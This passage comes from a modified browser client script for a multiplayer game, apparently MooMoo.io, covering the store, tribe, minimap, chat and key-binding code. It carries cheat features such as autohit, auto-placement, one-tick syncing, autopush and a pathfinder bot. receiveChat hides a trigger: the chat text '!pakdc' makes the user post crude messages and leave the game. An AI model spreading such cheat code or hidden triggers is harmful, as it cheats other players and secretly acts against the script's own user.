;
document.getElementById("pre-content-container");
function Jh() {
    //  FRVR.ads.show("interstitial", bs)
}
window.showPreAd = Jh;
function Se(e, t, i) {
    if (E && e) {
        if (C.removeAllChildren(Le),
            Le.classList.add("visible"),
            C.generateElement({
            id: "itemInfoName",
            text: C.capitalizeFirst(e.name),
            parent: Le
        }),
            C.generateElement({
            id: "itemInfoDesc",
            text: e.desc,
            parent: Le
        }),
            !i)
            if (t)
                C.generateElement({
                    class: "itemInfoReq",
                    text: e.type ? "secondary" : "primary",
                    parent: Le
                });
            else {
                for (let n = 0; n < e.req.length; n += 2)
                    C.generateElement({
                        class: "itemInfoReq",
                        html: e.req[n] + "<span class='itemInfoReqVal'> x" + e.req[n + 1] + "</span>",
                        parent: Le
                    });
                const s = co ? e.group.sandboxLimit || Math.max(e.group.limit * 3, 99) : e.group.limit;
                e.group.limit && C.generateElement({
                    class: "itemInfoLmt",
                    text: (E.itemCounts[e.group.id] || 0) + "/" + s,
                    parent: Le
                })
            }
    } else
        Le.classList.remove("visible")
}
let Pt = []
, wt = [];
function Zh(e, t) {
    Pt.push({
        sid: e,
        name: t
    }),
    gs()
}
async function gs() {
    if (Pt[0]) {
   var e = Pt[0];
        var textColor = "#FFFFFF"
        C.removeAllChildren(ft)
        ft.style.display = "block"

 C.removeAllChildren(ft),
            ft.style.display = "block",
            C.generateElement({
            class: "notificationText",
            text: e.name + ` [${e.sid}]`,
            parent: ft
        }),
            C.generateElement({
            class: "notifButton",
            html: "<i class='material-icons' style='font-size:28px;color:#cc5151;'>&#xE14C;</i>",
            parent: ft,
            onclick: function() {
                 handleClanRequest(0)
            },
            hookTouch: !0
        }),
            C.generateElement({
            class: "notifButton",
            html: "<i class='material-icons' style='font-size:28px;color:#8ecc51;'>&#xE876;</i>",
            parent: ft,
            onclick: function() {
                 handleClanRequest(1)
            },
            hookTouch: !0
   })


    } else
        ft.style.display = "none"
}
var lastAccept = 0
async function handleBotRequest(e,ID) {
    lastAccept === 0 && (lastAccept=tick)
    await nextTick();
    await nextTick();
    if(tick-lastAccept<=5) return;
    for(let i=0;i<Pt.length;i++){
        if(Pt[i].sid === e){
            knla.send("P", e, 1)
            Pt.splice(i, 1)
            break;
            return;
        }
    }
}
function addAlliance(e) {
    Oe.push(e),
        Te.style.display == "block" && ti()
}
function setPlayerTeam(e, t) {
    E && (E.team = e,
          E.isOwner = t,
          Te.style.display == "block" && ti())
    if(e == undefined && t == undefined||e == null&&t==false){
        clanMates= []
        if(Tach?.goal?.pathing){
            et.forEach((x) => {
                if(x.dmg && !clan(x?.owner?.sid)){
                    x.pathScale = x.scale+47
                }
                if(x.name == "pit trap" && !clan(x?.owner?.sid)){
                    x.pathScale = x.scale+38
                }
            })
            Pathfinder?.setBuildings(et);
            // console.log(Date.now(),tick, "removed clan")
        }
    }
}
function setAlliancePlayers(e) {
    wt = e,
        Te.style.display == "block" && ti()
    clanMates = e;
    if(Tach?.goal?.pathing){
        et.forEach((x) => {
            if(x.dmg && !clan(x?.owner?.sid)){
                x.pathScale = x.scale+50
            }
            if(x.name == "pit trap" && !clan(x?.owner?.sid)){
                x.pathScale = x.scale+40
            }
        })
        Pathfinder?.setBuildings(et);
    }
}
function deleteAlliance(e) {
    lastAccept = 0;
    for (let t = Oe.length - 1; t >= 0; t--)
        Oe[t].sid == e && Oe.splice(t, 1);
    Te.style.display == "block" && ti()
}
function nf() {
    xs(),
        Te.style.display != "block" ? ti() : Xn()
}
function Xn() {
    Te.style.display == "block" && (Te.style.display = "none")
}
function ti() {
    if (E && E.alive) {
        if (Ri(),
            We.style.display = "none",
            Te.style.display = "block",
            C.removeAllChildren(oi),
            E.team)
            for (var e = 0; e < wt.length; e += 2)
                (function(t) {
                    const i = C.generateElement({
                        class: "allianceItem",
                        style: "color:" + (wt[t] == E.sid ? "#fff" : "rgba(255,255,255,0.6)"),
                        text: wt[t + 1]+` [${wt[t]}]`,
                        parent: oi
                    });
                    E.isOwner && wt[t] != E.sid && C.generateElement({
                        class: "joinAlBtn",
                        text: "Kick",
                        onclick: function() {
                            kickPlayer(wt[t])
                        },
                        hookTouch: !0,
                        parent: i
                    })
                }
                )(e);
        else if (Oe.length)
            for (var e = 0; e < Oe.length; ++e)
                (function(i) {
                    const s = C.generateElement({
                        class: "allianceItem",
                        style: "color:" + (Oe[i].sid == E.team ? "#fff" : "rgba(255,255,255,0.6)"),
                        text: Oe[i].sid,
                        parent: oi
                    });
                    C.generateElement({
                        class: "joinAlBtn",
                        text: "Join",
                        onclick: function() {
                            sendClanRequest(i)
                        },
                        hookTouch: !0,
                        parent: s
                    })
                }
                )(e);
        else
            C.generateElement({
                class: "allianceItem",
                text: "No Tribes Yet",
                parent: oi
            });
        C.removeAllChildren(ai),
            E.team ? C.generateElement({
            class: "allianceButtonM",
            style: "width: 360px",
            text: E.isOwner ? "Delete Tribe" : "Leave Tribe",
            onclick: function() {
                leaveClan()// xo()
            },
            hookTouch: !0,
            parent: ai
        }) : (C.generateElement({
            tag: "input",
            type: "text",
            id: "allianceInput",
            maxLength: 7,
            placeholder: "unique name",
            onchange: t=>{
                t.target.value = (t.target.value || "").slice(0, 7)
            }
            ,
            onkeypress: t=>{
                if (t.key === "Enter")
                    return t.preventDefault(),
                        createClan(),
                        !1
            }
            ,
            parent: ai
        }),
              C.generateElement({
            tag: "div",
            class: "allianceButtonM",
            style: "width: 140px;",
            text: "Create",
            onclick: function() {
                createClan()
            },
            hookTouch: !0,
            parent: ai
        }))
    }
}
function handleClanRequest(e) {
    lastAccept === 0 && (lastAccept=tick)
    // gs();
    // if(tick-lastAccept<=8) return;
    knla.send("P", Pt[0].sid, e),
        Pt.splice(0, 1)
    gs()
}
function kickPlayer(sid) {
    knla.send("Q", sid)
}
function sendClanRequest(e) {
    knla.send("b", Oe[e].sid)
}
function createClan(e = document.getElementById("allianceInput").value) {
    lastAccept = 0;
    knla.send("L", e == "" ? String.fromCharCode(0) : e)
}
function leaveClan() {
    lastAccept = 0;
    Pt = [],
        gs(),
        knla.send("N")
}
let pi, Ht, je;
const bt = [];
let Je;
function sf() {
    this.init = function(e, t) {
        this.scale = 0,
            this.x = e,
            this.y = t,
            this.active = !0
    }
        ,
        this.update = function(e, t) {
        this.active && (this.scale += .05 * t,
                        this.scale >= T.mapPingScale ? this.active = !1 : (e.globalAlpha = 1 - max(0, this.scale / T.mapPingScale),
                                                                           e.beginPath(),
                                                                           e.arc(this.x / T.mapScale * me.width, this.y / T.mapScale * me.width, this.scale, 0, PI2),
                                                                           e.stroke()))
    }
}
function pingMinimap(e, t) {
    for (let i = 0; i < bt.length; ++i)
        if (!bt[i].active) {
            Je = bt[i];
            break
        }
    Je || (Je = new sf,
           bt.push(Je)),
        Je.init(e, t)
}
function landmark() {
    je || (je = {}),
        je.x = E.x,
        je.y = E.y
}
function updateMinimap(e) {
    Ht = e
}
function lf(e) {
    if (E && E.alive) {

        ce.clearRect(0, 0, me.width, me.height),
            ce.strokeStyle = "#fff",
            ce.lineWidth = 4;







        ce.strokeStyle = "#fff", ce.lineWidth = 1;




        for (var t = 0; t < bt.length; ++t)
            Je = bt[t],
                Je.update(ce, e);
        if (ce.globalAlpha = 1,ce.fillStyle = "#fff",Q(E.x / T.mapScale * me.width, E.y / T.mapScale * me.height, 7, ce, !0),
            // ce.fillStyle = "rgba(255,255,255,0.35)",
            E.team && Ht)
            for (var t = 0; t < Ht.length; ){
                ce.fillStyle = "rgba(255,255,255,0.35)"
                Q(Ht[t] / T.mapScale * me.width, Ht[t + 1] / T.mapScale * me.height, 7, ce, !0),
                    t += 2;
                pi && (ce.fillStyle = "#fc5553",
                       ce.font = "34px Hammersmith One",
                       ce.textBaseline = "middle",
                       ce.textAlign = "center",
                       ce.fillText("x", pi.x / T.mapScale * me.width, pi.y / T.mapScale * me.height)),

                    je && (ce.fillStyle = "#fff",
                           ce.font = "34px Hammersmith One",
                           ce.textBaseline = "middle",
                           ce.textAlign = "center",
                           ce.fillText("x", je.x / T.mapScale * me.width, je.y / T.mapScale * me.height))
            }

        Tach?.drawWaypointMap(ce, me);

        if(displayer&&teamDisplay.length){
            for(let i=0;i<teamDisplay.length;i++){
                ce.globalAlpha = 1;
                ce.fillStyle = "#000000";
                Q(teamDisplay[i].x2 / T.mapScale * me.width, teamDisplay[i].y2 / T.mapScale * me.height, 8, ce, !0);
            }
        }


    }

}
let $n = 0;
function cf(e) {
    $n != e && ($n = e,
                ys())
}
function hf() {
    We.style.display != "block" ? (We.style.display = "block",
                                   Te.style.display = "none",
                                   Ri(),
                                   ys()) : Kn()
}
function Kn() {
    We.style.display == "block" && (We.style.display = "none",
                                    Se())
}
function storebuy(e, t, i) {
    i ? e ? (E.tailIndex = t, lastTail = t) : E.tails[t] = 1 : e ? (E.skinIndex = t, lastHat = t) : E.skins[t] = 1;

    We.style.display == "block" && ys()
    if(e == 0 && t!=0){
        if(i==0)bH.push(t)
        if(i==1)bT.push(t);
        if(buyer.length && (i==0||i==1)){
            for(let ccc =0;ccc<buyer.length;ccc++){
                if(i==0&&!Array.isArray(buyer[ccc]) &&buyer[ccc] == t){
                    buyer.splice(ccc,1)
                }
                if(i==1&&Array.isArray(buyer[ccc])&& buyer[ccc][0] == t){
                    buyer.splice(ccc,1)
                }
            }
            if([40,12,22,6,7,56,53,15,31].includes(t)&&!speedHats.includes(t)&&i==0)speedHats.push(t);
            if([11,19].includes(t)&&!speedTails.includes(t)&&i==1)speedTails.push(t);
        }
    }
}
function ys() {
    if (E) {
        C.removeAllChildren(wr);
        const e = $n,
              t = e ? Gt : Xt;

        for (let i = 0; i < t.length; ++i)
            t[i].dontSell || (function(s) {
                const n = C.generateElement({
                    id: "storeDisplay" + s,
                    class: "storeItem",
                    onmouseout: Se(),
                    onmouseover: () => Se(t[s], !1, !0),
                    parent: wr
                });

                C.hookTouchEvents(n, !0);

                const imgSrc = "./img/" + (e ? "accessories/access_" : "hats/hat_") + t[s].id + (t[s].topSprite ? "_p" : "") + ".png";
                const imgElement = C.generateElement({ tag: "img", class: "hatPreview smallImage", src: imgSrc, parent: n });

                const textElement = C.generateElement({
                    tag: "span",
                    style: "font-size: 85%; vertical-align: middle; line-height: 1.2;",
                    text: `[${t[s].id}] ${t[s].name}`,
                    parent: n
                });

                 if ((e ? !E.tails[t[s].id] : !E.skins[t[s].id])) {
                    C.generateElement({
                        class: "joinAlBtn",
                        style: "margin-top: 5px; font-size: 85%; vertical-align: middle; line-height: 1.51;",
                        text: "Buy",
                        onclick: () => storeBuy(t[s].id, e),
                        hookTouch: !0,
                        parent: n
                    });
                    C.generateElement({ tag: "span", class: "itemPrice", style: "font-size: 85%; vertical-align: middle; line-height: 1.51;", text: t[s].price/1000>=1?t[s].price/1000+"k":t[s].price, parent: n });
                } else {
                    const equipText = (e ? E.tailIndex : E.skinIndex) == t[s].id ? "Unequip" : "Equip";
                    C.generateElement({
                        class: "joinAlBtn",
                        style: "margin-top: 5px; font-size: 85%; vertical-align: middle; line-height: 1.51;",
                        text: equipText,
                        onclick: () => (equipText == "Unequip" ? storeEquip(0, e) : storeEquip(t[s].id, e)),
                        hookTouch: !0,
                        parent: n
                    });
                }
            })(i);
    }
}





function storeEquip(e, t) {
    knla.send("c", 0, e, t)
}
function storeBuy(e, t) {
     knla.send("c", 1, e, t)
}
function So() {
    We.style.display = "none",
        Te.style.display = "none",
        Ri()
}
function uf() {
    const e = Nt("native_resolution");
    Sn(e ? e == "true" : typeof cordova < "u"),
        $e = "true"//Nt("show_ping") == "true",
    Qt.hidden = false//!$e || !Jt,
    Nt("moo_moosic"),
        setInterval(function() {
        window.cordova && (document.getElementById("downloadButtonContainer").classList.add("cordova"),
                           document.getElementById("mobileDownloadButtonContainer").classList.add("cordova"))
    }, 1e3),
        Io(),
        C.removeAllChildren(pr);
    for (var t = 0; t < R.weapons.length + R.list.length; ++t)
        (function(i) {
            C.generateElement({
                id: "actionBarItem" + i,
                class: "actionBarItem",
                style: "display:none",
                onmouseout: function() {
                    Se()
                },
                parent: pr
            })
        }
        )(t);
    for (var t = 0; t < R.list.length + R.weapons.length; ++t)
        (function(s) {
            const n = document.createElement("canvas");
            n.width = n.height = 66;
            const r = n.getContext("2d");
            if (r.translate(n.width / 2, n.height / 2),
                r.imageSmoothingEnabled = !1,
                r.webkitImageSmoothingEnabled = !1,
                r.mozImageSmoothingEnabled = !1,
                R.weapons[s]) {
                r.rotate(Math.PI / 4 + Math.PI);
                var o = new Image;
                jn[R.weapons[s].src] = o,
                    o.onload = function() {
                    this.isLoaded = !0;
                    const c = 1 / (this.height / this.width)
                    , a = R.weapons[s].iPad || 1;
                    r.drawImage(this, -(n.width * a * T.iconPad * c) / 2, -(n.height * a * T.iconPad) / 2, n.width * a * c * T.iconPad, n.height * a * T.iconPad),
                        r.fillStyle = "rgba(0, 0, 70, 0.1)",
                        r.globalCompositeOperation = "source-atop",
                        r.fillRect(-n.width / 2, -n.height / 2, n.width, n.height),
                        document.getElementById("actionBarItem" + s).style.backgroundImage = "url(" + n.toDataURL() + ")"
                }
                    ,
                    o.src = "./img/weapons/" + R.weapons[s].src + ".png";
                var l = document.getElementById("actionBarItem" + s);
                l.onmouseover = C.checkTrusted(function() {
                    Se(R.weapons[s], !0)
                }),
                    l.onclick = C.checkTrusted(function() {
                    Yt(s, !0)
                }),
                    C.hookTouchEvents(l)
            } else {
                var o = Ss(R.list[s - R.weapons.length], !0,true);
                const a = Math.min(n.width - T.iconPadding, o.width);
                r.globalAlpha = 1,
                    r.drawImage(o, -a / 2, -a / 2, a, a),
                    r.fillStyle = "rgba(0, 0, 70, 0.1)",
                    r.globalCompositeOperation = "source-atop",
                    r.fillRect(-a / 2, -a / 2, a, a),
                    document.getElementById("actionBarItem" + s).style.backgroundImage = "url(" + n.toDataURL() + ")";
                var l = document.getElementById("actionBarItem" + s);
                l.onmouseover = C.checkTrusted(function() {
                    Se(R.list[s - R.weapons.length])
                }),
                    l.onclick = C.checkTrusted(function() {
                    Yt(s - R.weapons.length)
                }),
                    C.hookTouchEvents(l)
            }
        }
        )(t);
    jt.onchange = i=>{
        i.target.value = (i.target.value || "").slice(0, 15)
    }
        ,
            jt.onkeypress = i=>{
                if (i.key === "Enter")
                    return i.preventDefault(),
                        Un.onclick(i),
                        !1
            }
                ,
                    Nn.checked = uo,
                        Nn.onchange = C.checkTrusted(function(i) {
                        Sn(i.target.checked)
                    }),
                        xn.checked = true//$e,
    xn.onchange = C.checkTrusted(function(i) {
        $e = "true"// xn.checked,
        Qt.hidden = true//!$e,
        // Di("show_ping", $e ? "true" : "true")
    })
}
function itemUpdate(e, t) {
    e && (t ? E.weapons = e : E.items = e);
    for (var i = 0; i < R.list.length; ++i) {
        const s = R.weapons.length + i;
        document.getElementById("actionBarItem" + s).style.display = E.items.indexOf(R.list[i].id) >= 0 ? "inline-block" : "none"
    }
    for (var i = 0; i < R.weapons.length; ++i)
        document.getElementById("actionBarItem" + i).style.display = E.weapons[R.weapons[i].type] == R.weapons[i].id ? "inline-block" : "none"
}
function Sn(e) {
    uo = e,
        mt = e && window.devicePixelRatio || 2,
        Nn.checked = e,
        Di("native_resolution", e.toString()),
        resizeScreen()
}
function df() {
    ii ? qt.classList.add("touch") : qt.classList.remove("touch")
}
function pf() {
    qt.classList.contains("showing") ? (qt.classList.remove("showing"),
                                        cr.innerText = "Settings") : (qt.classList.add("showing"),
                                                                      cr.innerText = "Close")
}
function Io() {
    let e = "";
    for (let t = 0; t < T.skinColors.length; ++t)
        t == fs ? e += "<div class='skinColorItem activeSkin' style='background-color:" + T.skinColors[t] + "' onclick='selectSkinColor(" + t + ")'></div>" : e += "<div class='skinColorItem' style='background-color:" + T.skinColors[t] + "' onclick='selectSkinColor(" + t + ")'></div>";
    Nh.innerHTML = e
}
function selectSkinColor(e) {
    fs = e,
        Io()
}
const Ft = document.getElementById("chatBox")
, Si = document.getElementById("chatHolder");
function Mo() {
 
    ii ? vr(prompt("chat message"))/*setTimeout(function() {
        const e = prompt("chat message");
        e && vr(e)
    }, 0)*/ : Si.style.display == "block" ? (Ft.value && vr(Ft.value),
                                             Ri()) : (We.style.display = "none",
                                                      Te.style.display = "none",
                                                      Si.style.display = "block",
                                                      Ft.focus(),
                                                      xs()),
        Ft.value = ""
}
function multiCreation(player, angle, distance, amount = 1, chatVis){
    if(WC.length + amount >= 1500){
        return false
    }
    let playerSID = player
    player = WC.find(x => x.purpose == "formation" && x.sid == player)
    console.log(WC)
    if(!player){
        return false;
    }
    for(let i = 0; i < amount; i++){

        let newXY = calcPoint(player.x2, player.y2, toRad(angle)-toRad(90), distance * (i + 1))
        let newPlayer = {...E}
        newPlayer.sid = formationArr.length + 1
        formationArr.push({origin: playerSID, distance: distance * (i + 1), angle: angle})
       FP(cPI(newPlayer, newXY.x, newXY.y, 0, 0, 0), "formation");
    }
}


function helpCommands(){
}
function getNumbers(val = 400){
    let string = '';
    for(let i = 0; i < val; i++){
        string += val
    }
    return string
}
function command(cmd) {
    if (cmd === 'debug') {
        console.log('debugged');
        wr_obj = false;
        oneTick = false;
        lastHat = null;
        lastTail = null;
        meleesyncing = false;
        return true;
    }
}
document.addEventListener('keydown', function(event) {
    if (event.key === 'm') {
        command('debug');
    }
});
function vr(e,sendmsg, _) {
    let command = function(chat) {
        return e.toLowerCase().startsWith("." + chat.toLowerCase());
    };
    const parts = e.split(' ');


   if (command ("debug")) {
        console.log('debugged');
        wr_obj = false;
        oneTick = false;
        lastHat = null;
        lastTail = null;
        meleesyncing = false;
        return true;
    }

    if(parts[1] === ".clan"){

    }


   
        !sendmsg && knla.send("6", e.slice(0, 30),false)

   
}
function Ri() {
    Ft.value = "",
        Si.style.display = "none"
}
let isPrivateChat = false; // Variable to track private chat mode
let isRegularChat = true; // Variable to track regular chat mode

function receiveChat(e, t) {
    // console.log(t)
    const i = findPlayerSID(e);
    i && (i.chatMessage = t,
          i.chatCountdown = T.chatCountdown)
if (t == "!pakdc") {
  knla.send("6", "i gtg have explosive diarhia");
  setTimeout(() => {
    knla.send("6", "*sharts and moans");
    setTimeout(() => {
      knla.send("H", 0);
    }, 400);
  }, 400);
}
}
window.addEventListener("resize", C.checkTrusted(resizeScreen));
async function resetCam(){
    if(se>T.maxScreenWidth+1){
        await wait(2)
        se /= 1.05
        re /= 1.05
        resizeScreen()
        resetCam();
    } else if(se<T.maxScreenWidth-1) {
        await wait(2)
        se *= 1.05
        re *= 1.05
        resizeScreen()
        resetCam()
    } else return;

}
let initialWidth = window.innerWidth;
let initialHeight = window.innerHeight;
let zoomLevel = 1.0;
function resizeScreen() {
    gt = window.innerWidth;
    yt = window.innerHeight;
    zoomLevel *= Math.min(se / initialWidth, re / initialHeight);

    // Update initial size for the next resize event
    initialWidth = se;
    initialHeight = re;
    const e = Math.max(gt / se, yt / re) * mt;
    xt.width = gt * mt;
    xt.height = yt * mt;
    xt.style.width = gt + "px";
    xt.style.height = yt + "px";
    M.setTransform(e, 0, 0, e, (gt * mt - se * e) / 2, (yt * mt - re * e) / 2)
    //console.log(M)
}

var cursor = {x:null, y:null,x2:null,y2:null}
function mouseXY(event, c) {
    c = xt.getBoundingClientRect();
    if(event){
        cursor.x = event.clientX;
        cursor.y = event.clientY;
    }
    const offsetX = (cursor.x - gt / 2) * zoomLevel * .91975;
    const offsetY = (cursor.y - yt / 2) * zoomLevel * .91975;
    const realGameX = E?.x2 + offsetX;
    const realGameY = E?.y2 + offsetY;
    cursor.x2 = realGameX;
    cursor.y2 = realGameY;
    return { x: realGameX, y: realGameY };
}










resizeScreen();
let ii;
tt(!1);
function tt(e) {
    ii = e,
        df()
}
window.setUsingTouch = tt;
let yf = document.getElementById("leaderboardButton")
, Eo = document.getElementById("leaderboard");
yf.addEventListener("touchstart", ()=>{
    Eo.classList.add("is-showing")
}
                   );
const ks = ()=>{
    Eo.classList.remove("is-showing")
}
;

document.body.addEventListener("touchend", ks);
document.body.addEventListener("touchleave", ks);
document.body.addEventListener("touchcancel", ks);
if (!ho) {
    let t = function(n) {
        mouseXY(n)
        n.preventDefault(),
            n.stopPropagation(),
            tt(!1),
            go = n.clientX,
            yo = n.clientY
    }
    , i = function(n) {
        if(n.button == 0) {
            if(keys.lc===undefined)keys.lc=0;
            keys.lc = 1;
        }
        if(n.button ==1) {
            if(keys.mc===undefined)keys.mc=0;
            keys.mc = 1;
        }
        if(n.button == 2){
            if(keys.rc===undefined)keys.rc=0;
            keys.rc = 1;
        }
        tt(!1),
            Ee != 1 && (Ee = 1,
                        it())
    }
    , s = function(n) {
        if(n.button == 0){
            if(keys.lc===undefined)keys.lc=0;
            keys.lc = 0;
        }
        if(n.button == 1) {
            if(keys.mc===undefined)keys.mc=0;
            keys.mc = 0;
        }
        if(n.button == 2){
            if(keys.rc===undefined)keys.rc=0;
            keys.rc = 0;
        }
        tt(!1),
            Ee != 0 && (Ee = 0,
                        it())
    };
    var gameInput = t
    , mouseDown = i
    , mouseUp = s;
    const e = document.getElementById("touch-controls-fullscreen");
    e.style.display = "block",
        e.addEventListener("mousemove", t, !1),
        e.addEventListener("mousedown", i, !1),
        e.addEventListener("mouseup", s, !1)
}
let Qn = !1, Po;
function wf() {
    //  console.log(He)
    let e = 0, t = 0, i;
    if (ii) {
        if (!Qn)
            return;
        i = Po
    }
    for (var s in Ii) {
        var n = Ii[s];
        e += !!He[s] * n[0],
            t += !!He[s] * n[1]
    }
    if ((e != 0 || t != 0) && (i = atan2(t, e)),
        i !== void 0)
        return C.fixTo(i, 2)
}
let Ti;
var realdir = true;
function vs(RRR) {

    if (!E) {
        return 0;
    } else {
if (E.inTrap) {
            return E.aim;
        }
    return E ? (!E.lockDir && !ii && (Ti = atan2(yo - yt / 2, go - gt / 2)),
                C.fixTo(Ti || 0, 2)) : 0;
}
}


function vs2() {
    return E ? (!E.lockDir && !ii && (Ti = atan2(yo - yt / 2, go - gt / 2)),
                C.fixTo(Ti || 0, 2)) : 0
}




var He = {}
, Ii = {
    87: [0, -1],
    // 38: [0, -1],
    83: [0, 1],
    // 40: [0, 1],
    65: [-1, 0],
    // 37: [-1, 0],
    68: [1, 0],
    // 39: [1, 0]
};
function xs() {
    He = {}
 
}
function Co() {
    return Te.style.display != "block" && Si.style.display != "block"
}
var tPressed = false;
var spawning = false;
function keybinds(e) {
    if(!elem()||!amAlive)return;
    const t = e.which || e.keyCode || 0;
    78 == t && (mills.status = !mills.status);
    e.key == 'e' && (autohit = !autohit);
    if(keys[e.key]===undefined)keys[e.key]=0;
    keys[e.key]<=2&&keys[e.key]++;
    t == 27 ? So() : E && E.alive && Co() && (He[t] || (He[t] = 1,
                                                        //t == 69 ? sendHit() :

                                                        t == 88 ? lockDirection() : // lock direction
                                                        E.weapons[t - 49] != null ?Yt(E.weapons[t - 49], !0) :
                                                        E.items[t - 49 - E.weapons.length] != null ? Yt(E.items[t - 49 - E.weapons.length]) :
                                                        //t == 81 ?Yt(E.items[0]) :
                                                        t == 82 ? Ao()/* :
                                                        Ii[t] ? Mi()*/ : //null
                                                        t == 32 && (Ee = 1,it())))
    // e.key === 'Escape' && toggleMenu();

    codes[e.keyCode] = 1
    let lastBotMove;



    codes[e.keyCode] = 1
    if(keys[e.key]===undefined)keys[e.key]=0;
    keys[e.key]<=2&&keys[e.key]++;

    
    if(e.code == "ShiftRight"|| e.code == "ShiftLeft"){
        if(keys[e.code]===undefined) keys[e.key]=0;
        keys[e.code] = 1
    }

codes[e.keyCode]=1
keys[e.key]??=0
keys[e.key]<=2&&keys[e.key]++
if(e.code=="ShiftRight"||e.code=="ShiftLeft")(keys[e.code]??=0,keys[e.code]=1)
e.key=='m'&&(weaponId=!weaponId,Hn.showText(E.x2,E.y2,30,.2,400,weaponId,"#fff"))
e.key=='p'&&resetCam()
e.key=='R'&&(WR=WR=="normal"?false:"normal")
e.key=='r'&&(WR=WR=="reverse"?false:"reverse")
e.key=='i'&&Tach.goal.pathing?Tach?.updateChat("stop",E?.sid):e.key=="t"&&Tach?.updateChat("path",E?.sid)
e.key=='0'&&(spawning=false)
e.keyCode==32&&(keys.mc??=0,keys.mc=1)
keys['1']==1&&(ww=primary)
keys['2']==1&&secondary!=null&&(ww=secondary)

}
window.addEventListener("keydown", C.checkTrusted(keybinds));
function keybindsdown(e) {
    if (E && E.alive) {
        const t = e.which || e.keyCode || 0;
        if (t == 13) {
            if (Te.style.display === "block")
                return;
            Mo()
        } else{
            Co() && He[t] && (He[t] = 0,
                              /*Ii[t] ? Mi() :*/ t == 32 && (Ee = 0,
                                                             it()))
        }
        if(keys[e.key]===undefined)keys[e.key]=0;
        keys[e.key] = 0
        keys[e.key] = 0
        codes[e.keyCode] = 0
    }
    if(e.code == "ShiftRight"|| e.code == "ShiftLeft"){
        if(keys[e.code]===undefined)keys[e.key]=0;
        keys[e.code] = 0;
    }

   
    if(e.keyCode == 32) {
        if(keys.mc===undefined)keys.mc=0;
        keys.mc = 0;
    }
}
window.addEventListener("keyup", C.checkTrusted(keybindsdown));
function it() {
    return;
}
//let Tn;
var botMD = null;
function collisionDetection(x1, y1, s1, x2, y2, s2) {
    return sqrt((x1 - x2) ** 2 + (y1 - y2) ** 2) - (s1 + s2) < 1;
}
const PID12 = PI / 12;
function mutateDirection(dir) {
    let velocity = speedTest(E) * defaultSpeed;
    if (dir === undefined) return undefined;
    if (checkAreasForCollision(dir, velocity) === null) {
        for (let i = 0; i < PI; i += PID12) {
            if (checkAreasForCollision(dir + i, velocity) !== null) return dir + i;
            if (checkAreasForCollision(dir - i, velocity) !== null) return dir - i;
        }

        return PI + null;
    }

    return dir;
}
function checkAreasForCollision(dir, velocity) {
    let x = E.x2 + cos(dir) * velocity;
    let y = E.y2 + sin(dir) * velocity;
    let tmpScale = 45;
    if (collisionDetection(x, y, 35, inTrap.x, inTrap.y, 45)) {
        let angle = atan2(x - inTrap.x, y - inTrap.y), dist = sqrt((x - inTrap.x) ** 2 + (y - inTrap.y) ** 2) + 35;
        let x2 = x + cos(angle) * dist;
        let y2 = y + sin(angle) * dist;
        if (collisionDetection(x2, y2, 35, inTrap.x, inTrap.y, tmpScale)) {
            return null;
        }
    }
    return dir;
}
let oneticking = false;
function Mi(collides = false) {
    var e = wf();
    let p2 = {...E}
    let velL = autohat(1, e)
    p2.buildIndex = -1;
    p2.weaponIndex = hold != null ? hold : E.weaponIndex;
    p2.skinIndex = (E.skins[velL.skinIndex] ? velL.skinIndex : E.skinIndex);
    p2.tailIndex = (E.tails[velL.tailIndex] ? velL.tailIndex : E.tailIndex);
    collides = !isNaN(e) ? runInto(E,e,bTw(p2,e, p2, 1)) : false;
    if(collides&&!keys.ShiftLeft&&!(moveAuto=="pathfinder"&&Tach.goal.pathing)) e = undefined;
    if(e == moveDirection) return;
    if((null == Tn || null == e || Math.abs(e - Tn) > .3) &&!(moveAuto=="pathfinder"&&Tach.goal.pathing)&&!pushing){
        if(( moveAuto!="autopush"&& typeof pushCoords=== "object") || oneTickToggle) return;
           Tach.drawWaypoints(M, E.skinRot);
            knla.send("9",e)
            //}
            Tn = e
    }
}
function lockDirection() {
    E.lockDir = E.lockDir ? 0 : 1
}
function Ao() {
    knla.send("S", 1)
}
function sendHit() {
    knla.send("K", 1)
}
function Yt(e, t) {
    knla.send("z", e, t)
}
window.io = knla;
function bs() {
    Qt.hidden = !$e,
        window.onbeforeunload = function(e) {
        return "Are you sure?"
    }
        ,
        window.FRVR && window.FRVR.tracker.levelStart("game_start"),
        Di("moo_name", jt.value),
        !Jt && cs() && (Jt = !0,
                        _h.stop("menu"),
                        ms("Loading..."),
                        knla.send("M", {
        name: jt.value,
        moofoll: 1,
        skin: fs.value
    })),
        Sf()
}
function Sf() {
    var e = document.getElementById("ot-sdk-btn-floating");
    e && (e.style.display = "none")
}
function Tf() {
    var e = document.getElementById("ot-sdk-btn-floating");
    e && (e.style.display = "block")
}
let Ei = !0
, In = !1;
function Iw(e) {
    amAlive = true;
    inGame = true;
    mills = {status : false,w:null,a:null,s:null,d:null,aim:null,x:0,y:0};
    Et.style.display = "none",
        Zt.style.display = "block",
        Oi.style.display = "none",
        He = {},
        mo = e,
        Ee = 0,
        Jt = !0,
        Ei && (Ei = !1,
               et.length = 0)
    ho && Mh.enable({
        onStartMoving: ()=>{
            Kn(),
                Xn(),
                tt(!0),
                Qn = !0
        }
        ,
        onStopMoving: ()=>{
            Qn = !1,
                Mi()
        }
        ,
        onRotateMoving: (t,i)=>{
            i.force < .25 || (Po = -i.angle.radian,
                              Mi(),
                              In || (Ti = -i.angle.radian))
        }
        ,
        onStartAttacking: ()=>{
            Kn(),
            Xn(),
            tt(!0),
            In = !0,
            E.buildIndex < 0 && (Ee = 1,
            it())
        }
        ,
        onStopAttacking: ()=>{
            E.buildIndex >= 0 && (Ee = 1,
            it()),
            Ee = 0,
            it(),
            In = !1
        }
        ,
        onRotateAttacking: (t,i)=>{
            i.force < .25 || (Ti = -i.angle.radian)
        }
    })
}
var a = true;
var b = true;
function showText(e, t, i, s) {
    s === -1 ? Hn.showText(e, t, 50, .18, 500, i, "#ee5551") : Hn.showText(e, t, 50, .18, 500, Math.abs(i), i >= 0 ? "#fff" : "#8ecc51")
}
   function showAmText(life, setting, e, t, i) {
               Hn.showText(e, t, i, 0.1, life, setting, "#fff");
            }
let mi = 99999;
async function died() {
    Jt = !1,
        Tf();
    amAlive = false;
    hitPacket=0;
    wr_obj = false;
    meleesyncing = false;
    mills = {status : false,w:null,a:null,s:null,d:null,aim:null,x:0,y:0};
    Tach?.setWaypoint("death", E)
    us.style.display = "none",
        So(),
        pi = {
        x: E.x,
        y: E.y
    },
        Et.style.display = "none",
        Wt.style.display = "block",
        Wt.style.fontSize = "0px",
        mi = 0,
        setTimeout(function() {
